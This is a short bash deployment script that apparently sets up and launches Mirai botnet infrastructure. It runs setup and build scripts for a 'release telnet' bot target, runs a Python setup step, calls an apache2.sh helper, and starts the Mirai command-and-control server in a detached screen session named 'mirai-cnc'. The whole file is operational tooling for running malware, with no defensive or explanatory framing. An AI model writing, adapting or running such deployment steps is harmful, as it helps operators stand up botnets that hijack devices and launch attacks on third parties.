#!/bin/bash
bash -c "source ${HOME}/.bashrc"
bash setup.sh
bash build.sh release telnet
python3 setup.py
bash build.sh release telnet_
cd release && bash ../apache2.sh
cd release && screen -dmS mirai-cnc ./cnc
